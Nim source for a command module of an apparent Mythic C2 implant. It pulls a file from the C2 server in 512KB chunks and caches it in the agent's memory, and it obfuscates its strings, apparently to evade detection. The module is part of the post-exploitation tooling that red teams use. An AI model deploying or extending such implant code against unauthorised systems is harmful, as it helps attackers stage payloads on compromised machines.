import json, base64
import ../utils/[strenc, m_responses, debug]
import ../global_data

const CHUNK_SIZE = 512000  # 512KB chunks

type
  RegisterFileArgs = object
    uuid: string
    name: string

proc registerFile*(taskId: string, params: JsonNode): JsonNode =
  ## Register a file in the agent's memory cache
  ## First response - request the file from Mythic for chunked download
  try:
    let args = to(params, RegisterFileArgs)
    debug "[DEBUG] register_file: Requesting file '" & args.name & "'"

    # Request the file from Mythic
    return %*{
      obf("task_id"): taskId,
      obf("upload"): {
        obf("file_id"): args.uuid,
        obf("chunk_num"): 1,
        obf("chunk_size"): CHUNK_SIZE,
        obf("full_path"): ""
      }
    }
  except Exception as e:
    return mythicError(taskId, obf("Failed to parse register_file parameters: ") & e.msg)

proc processRegisterFileChunk*(taskId: string, params: JsonNode, chunkData: string,
                                totalChunks: int, currentChunk: int,
                                fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the file being downloaded for caching
  try:
    let args = to(params, RegisterFileArgs)

    # Decode and append chunk data
    let decodedChunk = decode(chunkData)
    for b in decodedChunk:
      fileData.add(cast[byte](b))

    # If more chunks remain, request the next one
    if currentChunk < totalChunks:
      return %*{
        obf("task_id"): taskId,
        obf("upload"): {
          obf("chunk_size"): CHUNK_SIZE,
          obf("file_id"): args.uuid,
          obf("chunk_num"): currentChunk + 1,
          obf("full_path"): ""
        }
      }

    # All chunks received - store in cache
    let size = fileData.len
    cacheFile(args.name, fileData)

    debug "[DEBUG] register_file: Cached '" & args.name & "' (" & $size & " bytes)"

    return mythicSuccess(taskId, obf("File '") & args.name & obf("' cached successfully (") & $size & obf(" bytes)"))

  except Exception as e:
    return mythicError(taskId, obf("register_file chunk error: ") & e.msg)
